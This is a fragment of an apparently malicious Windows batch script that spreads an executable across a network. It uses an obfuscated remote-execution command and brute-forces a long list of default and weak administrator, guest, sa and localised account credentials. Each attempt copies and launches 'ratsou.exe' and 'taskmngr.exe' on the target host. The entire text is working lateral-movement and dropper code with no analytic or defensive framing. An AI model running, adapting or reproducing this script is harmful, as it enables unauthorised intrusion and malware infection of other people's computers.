%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
goto end
:administrator12342
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d taskmngr.exe
goto end
:administrator1232
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d taskmngr.exe
goto end
:administrator1234562
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" 
goto end
:adminadministrator2
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d taskmngr.exe
goto end
:adminblank2
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d taskmngr.exe
goto end
:sa2
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u sa -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d taskmngr.exe
goto end
:guestguest2
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d taskmngr.exe
goto end
:Administrateur2
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d taskmngr.exe
goto end
:Administrateurx22
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d taskmngr.exe
goto end
:student2
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u student -p "student" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d taskmngr.exe
goto end
:Invité2
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d taskmngr.exe
goto end
:amministratore2
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d taskmngr.exe
goto end
:uzivatel2
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d taskmngr.exe
goto end
:blkad2
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d taskmngr.exe
goto end
:adad2
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d taskmngr.exe
goto end
:adadmin2
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d taskmngr.exe
goto end
:rootroot2
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u root -p "root" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d taskmngr.exe
goto end
:adminad2
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d taskmngr.exe
goto end
:adtest2
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d taskmngr.exe
goto end
:forsterkning2
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d taskmngr.exe
goto end
:testt2
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u test -p "test" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d taskmngr.exe
goto end
:adtestt2
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d taskmngr.exe
goto end
:adtemp2
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d taskmngr.exe
goto end
:adtempp2
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d taskmngr.exe
goto end
:adpass2
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d taskmngr.exe
goto end
:adpassw2
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
goto end
:adminch2
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d taskmngr.exe
goto end
:Verwalter2
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d taskmngr.exe
goto end
:spanishadmin2
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d taskmngr.exe
goto end
:spanishadmin22
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d taskmngr.exe
:end

